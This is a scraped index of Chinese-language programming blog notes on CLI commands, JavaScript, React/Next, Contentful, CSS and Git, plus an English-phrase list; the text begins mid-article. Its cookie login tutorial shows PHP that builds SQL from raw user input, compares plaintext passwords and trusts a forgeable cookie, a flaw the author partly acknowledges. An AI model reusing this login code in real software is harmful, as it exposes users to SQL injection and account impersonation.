a book 有兩個 is，如果沒有做處理的話會變這樣： 12echo 'This is a book' | sed 's/is/IS/g'ThIS IS a book 如果只想改第二個 is，可以用正規的 &lt;&gt; 來包住單字（記得加上跳脫字元）： 12echo 'This is a book' | sed 's/\\&lt;is\\&gt;/IS/g' This IS a book 擷取字元cut -c &lt;n-m&gt; &lt;file&gt; 抓出第 n 個字元到第 m 個字元 12echo 1234567890 | cut -c 1-512345 cut -c &lt;n-m&gt; &lt;file&gt; --complement 排除第 n 個字元到第 m 個字元 12echo 1234567890 | cut -c 1-5 --complement67890 cut -d &lt;分隔字元&gt; -f &lt;要擷取的欄位&gt; &lt;file&gt; 假設有一個檔案內容是長這樣： 123AA,BB,CC,DD,EE,FFGG,HH,II,JJ,KK,LLMM,NN,OO,PP,QQ,RR 1234cut -d , -f 1 code.txtAAGGMM 流程： 第一行會分隔為，欄位一：AA，欄位二：BB，欄位三：CC … -f 說要擷取的欄位是 1，所以輸出 AA 換下一行，重複上面動作，直到最後一行。 如果要多個欄位可以寫成 -f &lt;連續欄位&gt;, &lt;單個欄位&gt;： 1234cut -d , -f 1-3,6 code.txtAA,BB,CC,FFGG,HH,II,LLMM,NN,OO,RR 就是取出每行的 1-3 欄跟 6 欄。 其他指令 whoami 我是誰，會顯示目前電腦的使用者名稱 less &lt;file-name&gt; 用分頁來查看檔案內容，可以用 ↑ ↓ 來 往上或往下滾；← → 來切換頁面，q 是退出，h 是看幫助。 explorer 開啟檔案總管 history 檢視所有指令紀錄 ipconfig 查詢主機的 IP 設定與地址 ping &lt;ip-address&gt; 連到某個主機（或域名），看看某個主機是開著還是關著的 uname Unix Name 的縮寫，列出主機的作業系統名稱 hostname 查看主機名稱 netstat 查詢網路目前的狀況 nslookup [&lt;domain-name&gt;] [id-address] 用 domain name 來查 IP 地址，也可反過來 telnet 連到指定的連接埠（port） date 顯示時間 tree 查看資料結構的樹狀圖，要顯示檔案可加上 /f base64 把左邊的 input 或右邊的 output 用 base64 來編碼（搭配 | 或 &lt; 使用），要解碼可以加上 -d tasklist 類似工作管理員，可以查看目前執行的程式 taskkill 關掉程式。//im 指定檔案名稱，//PID 指定 ID 想學更多可以參考的文章 學 sed Linux 指令 SED 用法教學、取代範例、詳解 參考資料linux 用 grep 查詢單個或多個字串（關鍵字）用 grep 搭配正規表示式擷取字串Redirecting Input and Output","link":"/2021/12/14/commandline-instruction/"},{"title":"日常英文用語","text":"這裡基本上只是隨手紀錄，因為最近開始想練習寫英文的技巧，所以會把一些詞彙或用語都放在這裡當作筆記。 導覽表達意見 我想… 我估計… 我認為… 對我而言… 在我的角度來看… 以我個人而言… 以我個人的經驗來看… 據我所知… 其他 畢竟 反過來說 讓我們試試看 比較容易 簡單來說 把 A 視為 B 小心謹慎 不久之前 特地 看來 既使 根據 這說得過去 挺有道理的 毫無疑問 你說的有點道理 我很感激那件事 謝謝你點出問題 讓我消化一下這件事 我想…I guess this is the only option we can choose.我想這是我們唯一能夠選的選項。 我估計…I supose our revenue will double after lauching this event.我估計在舉辦這個活動後，我們的收入將會翻倍。 我認為… In my opinion, ...In my opinion, increasing punishment cannot relieve the problem. 我認為加重罰款並不能減輕問題。 As I see it, ...As I see it, we should prioritize this task, otherwise, we may not finish it by deadline.我認為我們應該優先處理這項工作，否則，我們可能無法在期限之前完成。 對我而言…It seems to me that your idea may be too fancy.對我而言，你的想法有點不太實際。 在我的角度來看…From my perspective, family is the most precious asset in our life.在我的角度來看，家庭是我們人生中最寶貴的財產。 以我個人而言…Personally, I would rather donate money to animal society.以我個人而言，我寧可捐錢給動物機構。 以我個人的經驗來看…From my own experience, watching UK drama is the best way to learn British accent.以我個人的經驗來看，看英劇是學習英國口英的最佳方式。 據我所知…In my knowledge, there is no law protecting stray animals now.據我所知，目前沒有法律保護流浪動物。 畢竟After all, there are no subtitles in real conversations.畢竟，在實際交談中可是沒有字幕的。 反過來說A husband shoud never cheat on his wife, Conversely, a wife should never have an extra-marital affair. 讓我們試試看Let's try another approach to the matter.針對這件事情，讓我們用別的方法來試試看。 比較容易 Easier（A 比 B 容易）French is easier than German.法文比德文容易。 More easily （某個動作做起來比較容易）You can pay your bill more easily using the internet.你可以透過網路來繳你的帳單，這樣會比較容易。 簡單來說 In brief, ...In brief, my teammate is a slacker.簡單來說，我的隊友就是個雷包。 In short, ...In short, we need to hire at least three new people.簡而言之，我們至少還得雇用三個新人。 把 A 視為 B see + A as BHe sees Taiwan as a perfect vacation spot.他把台灣視為是一個完美的渡假勝地。 regard + A as BHe regard computer as his life.他把電腦當作是他的生命。 consider + A (to be) BI consider you (to be) my friend.我把你當作是我的朋友。 小心謹慎 beV careful + of（接環境中可能的危險、威脅）People need to be careful of snacks on the mountain.人們需要小心在山上的蛇。 beV careful + with（接需要謹慎處理的人事物）Alex is careful with the kittens. He is trying not to hurt them.他把電腦當作是他的生命。 不久之前It is not long ago that they arrived in Britain.他們是不久前到英國的。 特地My girlfriend went out of her way to make sushi for me.我女朋友特地為我做了壽司。 看來 It seems likeIt seems like their marriage is over.他們的婚姻好像結束了。 It looks likeIt looks like David will be able to come too.看來大衛好像也能來。 It seems thatIt seems that light energy will be an important subject of scientific research in the future.看來光能在未來的科學研究中會是一個很重要的課題。 It appears thatIt appears that you might be right.看來你可能是對的。 既使用來引導虛擬語氣、假定句子、或不見得真實的情況。 People can still go to colledge, even if they are not rich.就算(既使)不是很有錢，一般人還是可以讀大學。 根據 When they reach here they complain that they are not being paid as per the agreement.他們來到這裡後，他們抱怨工資沒有根據協議來發放。 You should transfer the deposit to our bank account before we start the production as per agreement.根據協議，你應該在我們開始生產前把訂金轉到我們的銀行戶頭。 這說得過去If I were rich, I wouldn’t be here. it makes sense.如果我很有錢我就不會在這裡了。好像是這樣。 挺有道理的I’m not reponsible for her, she ain’t my girlfriend anyway. That's reasonable.我沒有義務為她操心，她又不是我女朋友。挺有道理。 毫無疑問Warriros is gonna win. No doubt.勇士隊要贏了。毫無疑問 你說的有點道理The restaraunt is suck. You've got a point here.那間餐廳遜斃了。你說的有點道理。 我很感激那件事appreciate 是用來感謝一件事情，所以不可以說： I apprecaite you.，記得要在 apprecaite 後面加上一件事情（名詞或動名詞） I really appreciate that.我很感激那件事 謝謝你點出問題You better change you attitude or people would see you as an jerk. Thank you for pointing that out.你最好改變你的態度，否則別人會覺得你是個混帳。謝謝你點出問題。 讓我消化一下這件事Just give me a second. I need to get my head around this.給我一點時間。讓我消化一下這件事。","link":"/2021/07/29/common-english-idioms/"},{"title":"淺談時間複雜度與空間複雜度","text":"每次念這兩個詞都感覺很酷。 時間複雜度簡單來說就是一個演算法平均需要多少「時間」來完成。 但時間並不是一個很好的指標，畢竟你家電腦跟 NASA 的超級電腦完全是不同等級的東西吧？所以時間上的落差一定很大，因此比較好的指標是用「執行次數」來解釋。 範例假設要你在 1, 3, 4, 5, 9, 10 裡面找有沒有 9，最容易想到的演算法可能是： 演算法：從頭找到尾，看看有沒有。輸出：有（第五個） 所以我們的演算法在 6 個數字時要看 6 次，換句話說就是有 n 個數字就要看 n 次。 這時候的時間複雜度就會是：O(n) O(n) 是一個叫「Big O notation」的表示法： 把它想成是一種類似函數的東西就好，n 是你的輸入值，而 O(n) 的輸出結果代表「執行次數」： O(1) 常數，不論 n 是多少都只需要 1 個步驟（最屌的演算法） O(n) 當 n 是多少就要 n 個步驟（剛剛的範例） O(n^2) n 的 2 次方，每當 n 增加 1，就需要 n^2 步驟（n=1 =&gt; 1, n=2 =&gt; 4, … , n=10 =&gt; 100） O(2^n) 2 的 n 次方，每當 n 增加 1，就需要 2^n 步驟（n=1 =&gt; 2, n=2 =&gt; 4, … , n=10 =&gt; 1024） O(n!) n 階層，每當 n 增加 1，就需要 n! 步驟（n=1 =&gt; 1, n=2 =&gt; 2, … , n=10 =&gt; 3628800） 實作在知道時間複雜度後，我們可以來實作剛剛的演算法： 1234567891011121314// 時間複雜度 o(n) =&gt; n 有幾個就要看幾個數字 function hasNumber(numbers, searchNumber) { let result = false // 看每一個數字，有就填入 true for (let number of numbers) { if (number === searchNumber) { result = true } } // 回傳結果 return result}const numbers = [1, 3, 4, 5, 9, 10]console.log(hasNumber(numbers, 10)) // true 現在如果要查詢的數字變多了呢？如果沿用剛剛的演算法，時間複雜度會變成：O(n*m) 12345678910111213141516171819202122// 時間複雜度 o(n*m) =&gt; n 有幾個就要看幾個數字，查 m 次就要做幾次查詢的動作function hasNumber(numbers, searchNums) { let result = [] // 查詢幾次 for(let i=0; i&lt;searchNums.length; i++) { // 看每一個數字 for (let number of numbers) { // 找到就填入 true if (number === searchNums[i]) { result[i] = true } } // 找不到就填入 false if (!result[i]) { result[i] = false } } // 回傳結果 return result}const numbers = [1, 3, 4, 5, 9, 10]console.log(hasNumber(numbers, [2, 3, 5, 9])) // [ false, true, true, true ] 詳細的步驟可以參考下面： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// 查第一次：2i 0number: 1searchNums: 2number: 3searchNums: 2number: 4searchNums: 2number: 5searchNums: 2number: 9searchNums: 2number: 10searchNums: 2// 查第二次：1i 1number: 1searchNums: 3number: 3searchNums: 3number: 4searchNums: 3number: 5searchNums: 3number: 9searchNums: 3number: 10searchNums: 3// 查第三次：2i 2number: 1searchNums: 5number: 3searchNums: 5number: 4searchNums: 5number: 5searchNums: 5number: 9searchNums: 5number: 10searchNums: 5// 查第三次：3i 3number: 1searchNums: 9number: 3searchNums: 9number: 4searchNums: 9number: 5searchNums: 9number: 9searchNums: 9number: 10searchNums: 9 空間複雜度前面講時間，現在講空間，所謂空間複雜度是指：一個演算法平均需要多少「空間」來完成 在剛剛找數字的範例中，我們的演算法並沒有「儲存」任何資訊，所以空間複雜度就是 0。 然而，在前面實作部分中可以發現到當想查詢「多個數字」時，這套演算法的時間複雜度就會變成 O(n*m)，應該有更好的作法才對？畢竟沒有必要每次都從頭找到尾阿！ 以空間換取時間與其每次都從頭找到尾，不如建立一個「表格」，要查數字時只需要「一個步驟」：查表格 有個很經典的例子：費式數列 範例在 1, 3, 4, 5, 9, 10 裡面找有沒有 2, 3, 5, 9 這些數字： 演算法： 先建立一個數字表 把有出現的數字記下來（1, 3, 4, 5, 9, 10） 要找數字就直接查表格 輸出： 2 =&gt; 沒有（查表 False）3 =&gt; 有（查表 True）5 =&gt; 有（查表 True）9 =&gt; 有（查表 True） 這時後時間複雜度就從剛剛的 O(n*m) 變成 O(n+m)，但同時也利用了「空間」來儲存一些資訊，這就叫作「以空間換取時間」。 實作一樣來實作一下這套演算法： 1234567891011121314151617181920212223242526272829// 時間複雜度 o(n+m)// =&gt; 建立表格要先看 n 個數字// =&gt; 查 m 次 = 查幾次表格function hasNumber(numbers, searchNumbers) { let result = [] // 所有的數字表格 let table = {} // 建立 1~100 的表格 for (let i=1; i&lt;=100; i++) { table[i] = false } // 把出現的數字儲存起來 for (let i=0; i&lt;numbers.length; i++) { table[numbers[i]] = true } // 找數字，直接查表 for (searchNumber of searchNumbers) { // 有出現在表格裡填入 true，沒有則填入 false if (table[searchNumber]) { result.push(true) } else { result.push(false) } } return result}const numbers = [1, 3, 4, 5, 9, 10]const searchNumbers = [2, 3, 5, 9]console.log(hasNumber(numbers, searchNumbers)) // [ false, true, true, true ] 詳列步驟的話會是這樣： 123456789101112131415161718192021222324252627282930313233343536371. 建立數字表格：{ '1': false, '2': false, '3': false, '4': false, '5': false, '6': false, '7': false, '8': false, '9': false, '10': false, ...}2. 把出現過的數字儲存起來：{ '1': true, '2': false, '3': true, '4': true, '5': true, '6': false, '7': false, '8': false, '9': true, '10': true, ...}3. 查表格要找的數字：2，查表格 =&gt; false要找的數字：3，查表格 =&gt; true要找的數字：5，查表格 =&gt; true要找的數字：9，查表格 =&gt; true輸出結果：[ false, true, true, true ] 其實也有更快的作法，直接把「有出現的數字」記起來就好： 12345678910111213141516171819202122function hasNumber(numbers, searchNumbers) { let result = [] // 儲存所有數字 let table = {} // 建立表格（把有出現的數字存起來） for (number of numbers) { table[number] = true } // 找數字（直接查表） for (searchNumber of searchNumbers) { // 有出現在表格裡填入 true，沒有則填入 false if (table[searchNumber]) { result.push(true) } else { result.push(false) } } return result}const numbers = [1, 3, 4, 5, 9, 10]const searchNumbers = [2, 3, 5, 9]console.log(hasNumber(numbers, searchNumbers)) // [ false, true, true, true ] 步驟跟剛剛差不多，只差在表格建立的內容而已： 123456789101112131415161. 建立表格{ '1': true, '3': true, '4': true, '5': true, '9': true, '10': true }2. 查表格searchNumber: 3searchNumber: 5searchNumber: 9輸出結果：[ false, true, true, true ] 以上就是關於時間複雜度與空間複雜度的簡單解說，謝謝觀看。","link":"/2022/01/17/complexity-analysis/"},{"title":"讓手機連到 VS-Code 上的 Live Server","text":"懶人包。 備註要用這個方法的前提是「手機跟電腦連到同一個 wifi」，換句話說就是在相同內網裡面才可以互連。 流程 下載 Live Server 套件 在 vs-code 的設定 JSON 檔加上這段： 1\"liveServer.settings.useWebExt\": true, 在 vs-code 上打開 liver-server 後，用手機輸入電腦的 IP 位址： 備註：你可以用 CLI 的 ipconfig 指令來查 IP 位址 1ipconfig 輸出結果（我只截重點）： 12345678Wireless LAN adapter Wi-Fi: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 192.168.1.107 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::127b:efff:fe16:5d26%20 192.168.1.1 在手機網址輸入 IPv4 Address 的位址就行囉。","link":"/2022/01/31/connect-to-live-server/"},{"title":"你不知道的 console 小技巧","text":"無聊翻書時看到的，筆記一下。 各種 log 的方式123console.info('testing');console.error('I\\'m a error');console.warn('Warning'); 主要是前面的 icon 不一樣，也能透過側邊攔來篩選訊息： 群組起來group 可以把東西群組起來： 123456console.group('my logs');console.log('A: yoyoyo~~');console.log('B: oppps!!');console.log('C: warning!!');// 到這邊結束console.groupEnd(); 用表格來呈現物件跟陣列這個意外的很好用： 123456789101112131415const people = [ { name: 'PeaNu', age: 20 }, { name: 'PPB', age: 22 }, { name: 'Cris', age: 30 }];console.table(people); 條件式的顯示 log當第一個參數是 false 時就顯示後面的訊息： 1console.assert(false, 'has a problem here'); 所以可以這樣運用： 12let n = 100;console.assert(n &lt; 10, 'n is bigger than 10'); 測時時間當你想測試一段 code 的執行時間時可以用這招： 123console.time();const n = Math.random();console.timeEnd(); 輸出結果就會是： 1default: 0.010009765625 ms","link":"/2022/03/03/console-tricks/"},{"title":"Contentful 懶人包","text":"學 Next 時使用的一種工具，還蠻不錯用的。 What is this?Contentful 是一種 CMS（Content Management System），而且是「Headless」的 CMS。建議先參考這個影片理解一下 Headless 跟一般的 CMS 差別在哪？我覺得解釋的很清楚。 簡單來說它就是一種「介面」，讓你可以在上面管理內容，實際用起來會像這樣： 當我們在 Contentful 建立好內容後，會透過 API（AKA Contentful SDK）來把內容串接到前端上。 因為是 Headless，代表前端的部分是可以自由發揮的，你可以拿來串接到任何你想要的框架上，例如 React.js 或 Next.js。 總而言之，Contentful 是一套不錯用的 CMS，所以才會寫這篇來紀錄。 基本概念與功能Space可以想成是 Collection 的概念，就是「拿來放所有東西的地方」。免費帳戶只會有一個，要有多個的話必須付費才行。 雖然說免費帳戶只有一個，不過只是要拿來練習的話算是綽綽有餘了。 Content Model用來定義內容的「欄位」，你可以在這邊定義： 內容該有哪些欄位？ 欄位的種類是文字？還是圖片？等等 欄位的規則？（必填、Regex、檔案種類等等） 例如說我有一個食譜的內容，那就會有這樣的 Model： Content這邊就是「編輯內容」的地方，編輯的欄位會依照「Content Model」的設定來讓我們填寫： Media除了文字以外，你也可以把本機的「多媒體」內容，例如圖片，上傳到 Contenful 上。 上傳以後就可以在編輯的時候直接拿來用，這樣就不用再另外找第三方服務來幫你把圖片轉成 url 了，例如 Imgur。 API 串接這邊會以 Next 為例。 讀取懶人包： createClient 來跟 Contentful 連線 getEntries 抓取某個 content 1234567891011121314151617181920212223import { createClient } from 'contentful'export async function getStaticProps() { const client = createClient({ space: process.env.CONTENTFUL_SPACE_ID, accessToken: process.env.CONTENTFUL_ACCESS_TOKEN }) const response = await client.getEntries({ content_type: 'recipe' }) return { props: { recipes: response.items } }}export default function Recipes({ recipes }) { console.log('props', recipes) return &lt;div className='recipe-list'&gt;Recipe List&lt;/div&gt;} 讀取（搭配 query）當你想要抓取「單筆」資料時可能就會需要用到 query，可以用 'fields.&lt;property&gt;' 的方式來指定： 12345678910111213141516171819202122232425import { createClient } from 'contentful'export async function getStaticProps() { const client = createClient({ space: process.env.CONTENTFUL_SPACE_ID, accessToken: process.env.CONTENTFUL_ACCESS_TOKEN }) const response = await client.getEntries({ content_type: 'recipe', // 找出相同 slug 的食譜 'fields.slug': params.slug }) return { props: { recipes: response.items } }}export default function Recipes({ recipes }) { console.log('props', recipes) return &lt;div className='recipe-list'&gt;Recipe List&lt;/div&gt;} 渲染 Rich Text如果內容包含「rich-text」的話會發現拿到的內容會長這樣： 這樣就不知道要怎麼輸出了對吧？ 不過 contentful 早就幫你準備好了，只要用它提供的 @contentful/rich-text-react-renderer 來處理就行了。 附上官網範例： 12345678910111213141516171819202122import { documentToReactComponents } from '@contentful/rich-text-react-renderer'const document = { nodeType: 'document', data: {}, content: [ { nodeType: 'paragraph', data: {}, content: [ { nodeType: 'text', value: 'Hello world!', marks: [], data: {} } ] } ]}documentToReactComponents(document) // -&gt; &lt;p&gt;Hello world!&lt;/p&gt; 這樣子可以輸出正確 HTML 格式的內容了。","link":"/2022/09/16/contentful-notes/"},{"title":"把 Array-like-object 變成 Array","text":"感覺是該學會的小技巧。 簡述我們熟悉的 String、arguments、Nodelist、HTMLCollection 這些東西，雖然都可以用： 1234String[0]arguments[0]Nodelist[0]HTMLCollection[0] 來存取他們，但它們都是「Array-like-object」，不是真的 Array，所以不能用 Array 的內建方法。 如果真的想要用的話怎麼辦？試試看下面的做法吧！ Array.from1234const string = 'I am PeaNu'const array = Array.from(string)console.log(array) // ['I', ' ', 'a', 'm', ' ', 'P', 'e', 'a', 'N', 'u']console.log(Array.isArray(array)) // true ES6 的展開運算子 …1234const string = 'I am PeaNu'const array = [...string]console.log(array) // ['I', ' ', 'a', 'm', ' ', 'P', 'e', 'a', 'N', 'u']console.log(Array.isArray(array)) // true","link":"/2022/01/20/convert-array-like-object-to-array/"},{"title":"快速轉成二進位的方法","text":"難道你跟以前的我一樣以前不知道嗎？ 秘訣String.toString(radix) 其實可以帶入一個 radix 來指定要轉成幾進位，範圍是 0 ~ 32。","link":"/2021/12/22/convert-number-base/"},{"title":"把 Object 的 value 抽出來變成 Array","text":"相信將來會需要它。 Object.values這是最簡單又快速的方法： 1234567const obj = { name: 'PeaNu', age: 20, gender: 'man'}const array = Object.values(obj)console.log(array) // [ 'PeaNu', 20, 'man' ] Object.keys原理是先把 key 抽出來，在用 key 把 value 抽出來變成一個 Array： 123456789const obj = { name: 'PeaNu', age: 20, gender: 'man'}const keysArray = Object.keys(obj) // [name, age, gender]const valueArray = keysArray.map((elem) =&gt; obj[elem])console.log(valueArray) // [ 'PeaNu', 20, 'man' ]console.log(Array.isArray(valueArray)) // true Object.entries這個只是順便介紹一下他的用法，通常不會用這招來取 value。 簡單來說這個會把 key 和 value 湊成一組 Array，變成 [key, value]，直接來看範例： 123456789101112const obj = { name: 'PeaNu', age: 20, gender: 'man'}const keyValueArray = Object.entries(obj)console.log(keyValueArray)// [// ['name', 'PeaNu'],// ['age', 20],// ['gender', 'man']// ] 這邊通常會在把它做 flat() 或是用 for...of 來取值： 12345678910111213const obj = { name: 'PeaNu', age: 20, gender: 'man'}for (const [key, value] of Object.entries(obj)) { // name, age, gender console.log('key', key) // PeaNu, 20 man console.log('value', value)}// ['name', 'PeaNu', 'age', 20, 'gender', 'man']console.log(Object.entries(obj).flat()) for…in原理是利用 for...in 遍歷物件的 key 再取出 value 來推入新的 Array： 12345678910let array = []const obj = { name: 'PeaNu', age: 20, gender: 'man'}for (let key in obj) { array.push(obj[key])}console.log(array) // [ 'PeaNu', 20, 'man' ] for…of原理是用 Object.keys 取出 key 的 Array，再遍歷 Array 取出值（就是物件的 key）來建立 Array： 12345678910let array = []const obj = { name: 'PeaNu', age: 20, gender: 'man'}for (let value of Object.keys(obj)) { array.push(obj[value])}console.log(array) // [ 'PeaNu', 20, 'man' ]","link":"/2022/01/20/convert-object-value-to-array/"},{"title":"利用 Cookie 實作登入機制","text":"想記下來。 簡述因為 HTTP 協議本身是「無狀態」的，所以要讓它可以記得「每個 request 之間的關聯性」才能做出登入機制。 登入的流程是這樣子： 填好帳密後送出表單 =&gt; 第一個 request Server 確認帳密無誤，重新導回首頁 =&gt; 第二個 request （回到首頁也會發一個 request） 最簡單的方式Server 可以透過 cookie 來做設定，讓瀏覽器在下一次的 request 自動把 cookie 帶上。 拿留言板的例子來舉例： 123456789101112131415161718/* handle_login.php */&lt;?php $sql = \"SELECT * FROM users WHERE username='$username' AND password='$password'\"; // 下 query $result = $conn-&gt;query($sql); // 有撈到資料就代表帳號密碼正確 if ($result-&gt;num_rows &gt; 0) { // cookie 的過期時間 $expire = time() + 3600 * 24 * 30; // 設定 cookie setcookie('username', $username, $expire); // 登入成功，導回首頁 header('Location: ./index.php'); } else { // 登入失敗，顯示錯誤訊息 header('Location: ./login.php?errorCode=2'); }?&gt; 當登入成功後，可以打開 devtool 看看這之間發生了什麼。 首先，Server 會回傳 Set-Cookie 這個 header，也就是 PHP 中寫入的值 username=$username： 接著被導回首頁後，會看到 request header 就會自動把剛剛的 cookie 給帶上來： 這時候 index.php 就可以利用 cookie 的值來檢查這個 user 有沒有登入： 1234567891011121314151617/* index.php */&lt;?php require_once(\"./conn.php\"); require_once(\"./utils.php\"); // 預設值 null，代表沒有登入 $username = Null; // 檢查 cookie if (!empty($_COOKIE['username'])) { // 如果 cookie 的 username 欄位有值， // 就更新 $username 的值 $username = $_COOKIE['username']; // 去資料庫撈出這個 user 的資料 $user = getUser($username); // 這個 user 的暱稱 $nickname = $user['nickname']; }?&gt; 最後就完成登入機制了： 這就是最最最基本的登入功能了，只是這個做法有個問題，就是別人可以竄改 cookie 值來假冒別人身分，這邊我另外開一篇文章來解釋，請參考 當 Cookie 被竄改會怎麼樣？","link":"/2022/02/08/cookie-and-login-system/"},{"title":"CRA－解決 source map 載入問題的 Warning","text":"只是順手記一下。 簡述在使用 create-react-app 時有時候會碰到某些套件的 source map 無法載入，所以編譯完後就會出現底下的 Warning 訊息： WARNING in ./node_modules/@firebase/auth/dist/auth.esm.jsModule Warning (from ./node_modules/source-map-loader/dist/cjs.js):Failed to parse source map … 總之這個解法有兩個： 1. 到 react-script 中設定 webpack config： 附註：路徑為 packages/react-scripts/config/webpack.config.js 123456789101112 // Turn off performance processing because we utilize // our own hints via the FileSizeReporter performance: false, // 加上下面這段 ignoreWarnings: [ // Ignore warnings raised by source-map-loader. // some third party packages may ship miss-configured sourcemaps, that interrupts the build // See: https://github.com/facebook/create-react-app/discussions/11278#discussioncomment-1780169 { message: /source-map-loader/ }, ], };}; 2. 在根目錄下建立 .env 檔案： 1GENERATE_SOURCEMAP=false 參考資源 fix: ignore webpack warnings by source-map-loader Failed to parse source map","link":"/2022/07/01/cra-source-map-problem/"},{"title":"利用 border-radius 來畫圓形","text":"還蠻常用到的一個小技巧 示範只要做出一個正方形，再設定 border-radius 為寬度的一半就能畫出來： 1&lt;div class=\"box\"&gt;box1&lt;/div&gt; 123456.box { width: 100px; height: 100px; /* 50px 跟 50% 是一樣的 */ border-radius: 50px;} 淺談 border-radius 的原理border-radius 設定的是一個圓的「半徑」，而原理就是「畫一個圓形」來切割出圓角。 所以其實它完整的寫法應該是這樣子： 123.box { border-radius: 50px/50px} 代表這個圓的垂直半徑是 50px，水平半徑是 50px： 接著再拿這個圓去切割出圓角： 結果： 備註：為了方便理解，所以這裡先把正方形尺寸設為 150px，所以最後切出來才會不是圓形。 在圓形的情況下是這樣子： 結果： 想了解更多可以參考：了解一下border-radius的实现原理","link":"/2022/01/12/create-a-circle-by-border-radius/"},{"title":"建立 Array 的別種方法","text":"有些時候蠻實用的。 以數列來舉例假設想產生 1~10 的數列，有以下幾種做法： Array(n) + map1console.log(Array(10).fill(0).map((elem, index) =&gt; index + 1)) 步驟是這樣子： 123Array(10) =&gt; [empty x 10]fill(0) =&gt; [0, 0, 0, ...]map((elem, index) =&gt; index + 1) =&gt; return 1, return 2, return 3, ... 因為元素一開始是 empty，map 是收不到的，所以一定要先用 fill 來填值 map 才能收到。 Array.from({length: n}) + map1console.log(Array.from({length: 10}).map((elem, index) =&gt; index + 1)) 解釋一下，Array.from() 是在裡面塞 array-like 的物件來「產生新陣列」，而粗略一點來說只要有 length 屬性的物件都可以當作是 array-like，所以： 12345678const newArr1 = Array.from('str')const newArr2 = Array.from({a: '1', b: '2', c: '3'}) // 真的物件const newArr3 = Array.from({a: '1', b: '2', c: '3', length: 3}, ) // array-likeconst newArr4 = Array.from({0: 'A', 1: 'B', 2: 'C', length: 3}, ) // array-likeconsole.log(newArr1) // ['s', 't', 'r']console.log(newArr2) // []console.log(newArr3) // [undefined, undefined, undefined]console.log(newArr4) // ['A', 'B', 'C'] Array.from 會試著用 obj[i] 去存取 key 對應到的 value，所以 newArr4 可以得到 'A' 'B' 'C' 但是 newArr3 只會得到 undefined（因為沒有對應的 key 值） 所以 Array.from({length: 10} 其實就是幫你產生 10 個 undefined 的元素，像這樣： 1Array.from({length: 10}) =&gt; [undefined, undefined, undefined, undefined, ...] 接著再用 map 來改成我們希望的值而已，原理其實就跟第一種方法一模一樣： 1[undefined, undefined,].map(elem, index) =&gt; index + 1) =&gt; [1, 2, 3, ...] 或其實整個程式碼還可以再縮寫成這樣： 1console.log(Array.from({length: 10}, (elem, index) =&gt; index + 1)) 因為 Array.from 的第二個參數就是 map。","link":"/2022/01/05/create-array-methods/"},{"title":"在 Create React App 中使用絕對路徑","text":"很實用的設定。 簡述雖然 官方文件 裡就有補充這一點，不過還是想順便記錄一下。 簡單來說，在沒做任何設定時，當我們要 import 時都只能用「相對路徑」，像這樣： 123456// 假設目前位置為 src/components/Componentimport { getUser } from \"../utils/api\"function Component () { return ...} 很明顯的缺點是當資料結構越複雜時，路徑就會變得越難處理。 所以只要加上一個設定後，就可以變成這樣： 12345import { getUser } from \"utils/api\"function Component () { return ...} 改用絕對路徑的方式來設定會簡單許多。 設定方式如果是 JS 的話建立 jsconfig.json，TS 的話建立 tsconfig.json，然後加上這段： 123456{ \"compilerOptions\": { \"baseUrl\": \"src\" }, \"include\": [\"src\"]} 應該看一下內容就知道這是把 baseUrl 的位置設為 src，所以當我想用任何 src 底下的東西時，只要 dir/***/*** 就能直接搞定了。","link":"/2022/06/26/create-react-app-set-absolute-path/"},{"title":"從自己做版控來學 Git","text":"假設要你做一個版本控制，你會怎麼做？ 跟著這個文章一起做，做完後你就會發現 Git 的概念其實很簡單，沒有你想的那麼複雜！ 動手做一做假設你有一些檔案長這樣： 12code_v1note_v1 假設 code_v1 有更新時，你應該會這樣做： 123code_v2code_v1note_v1 隨著更新越來越多時，最後可能變成這樣： 123456code_v9code_v2code_v3note_v1note_v4note_v5 當檔案變成這樣子時，會有一個問題：你怎麼知道哪一個 code 是對應到哪一個 note？ 如果這些檔案是一個程式的話，那麻煩就會很大。如果你沒有用對應的 code 去搭對應的 note，你的程式可能就會出錯。 那有沒有什麼更好的做法呢？ 有阿，每次只要一更新，我就開一個「新的資料夾」來儲存所有最新的檔案不就 OK 了嗎： 123-- v1（資料夾） --code --note 很多次的更新後… 123456789-- v1（資料夾） --code --note-- v2（資料夾） --code --note... 這樣就解決了「相依性」的問題。現在不管是哪一個資料夾內的 code 跟 note，我們都能確保他一定可以正常運作。 現在另外一個問題來了，如果有些檔案我不想要加入版控呢？ 也不用想得太複雜啦，既然我們會把要做版控的檔案都放到一個資料夾中，那只要反過來思考就好，我們不想要做版控的檔案，就「不要放到資料夾」中： 1234-- v1（資料夾） --code --note--abc（不要做版控的檔案） 很多次的更新後… 123456789-- v1（資料夾）-- v2（資料夾）...-- v10（資料夾） --code --note--abc（不要做版控的檔案） 所以 abc 永遠就只會是 abc，不管做了幾次更新，他都與我們的版控沒有關係。 修但幾勒！ 在你準備洗洗睡之前，還有最後一個問題又蹦出來了：如果多人協作的話要怎麼辦？ 沒錯，我們的精心製作的版控在「只有一個人的情況下」，可以說是完美於缺的；但如果不是呢？ 想一下這個情境： 123-- v1 --code --note PeaNu 對 v1 做了一點更新，所以建立了一個新的資料夾。 123-- v2 --code --note PPB 對 v1 做了一點更新，所以建立了一個新的資料夾。 123-- v2 --code --note 聰明的你知道這個時候就會有問題了，因為 PeaNu 跟 PPB 的檔案名稱都是 v2，會有重複命名的問題。 聰明的你又知道，既然這樣會有重複命名的問題，那我每一次都用「亂數」來幫資料夾命名就好了呀！ 123-- kjdanskdqwwe --code --note PeaNu 對 kjdanskdqwwe 做了一點更新，所以建立了一個新的資料夾。 123-- njkdnkngwf --code --note PPB 對 kjdanskdqwwe 做了一點更新，所以建立了一個新的資料夾。 123-- 4oy904ue9tjwr --code --note 所以最後的情況會是這樣： 123-- kjdanskdqwwe-- 4oy904ue9tjwr-- njkdnkngwf 好啦，現在確實解決了重複命名的問題，但我現在是要怎麼知道哪個是最新的版本，還有每個版本的順序？ 別急，我們在開一個檔案用來做記錄不就好了嗎： 123456-- kjdanskdqwwe-- 4oy904ue9tjwr-- njkdnkngwf--order（儲存版本的順序：kjdanskdqwwe -&gt; ... -&gt; njkdnkngwf）--newest（儲存最新的版本：4oy904ue9tjwr） 恭喜你，現在你的版控不論是單人或多人協作都能平平安安，而且還可以選擇那些東西要做版控，哪些不要。 總結最後來複習一下整個流程吧： 每當發生更新，就建立一個新的資料夾 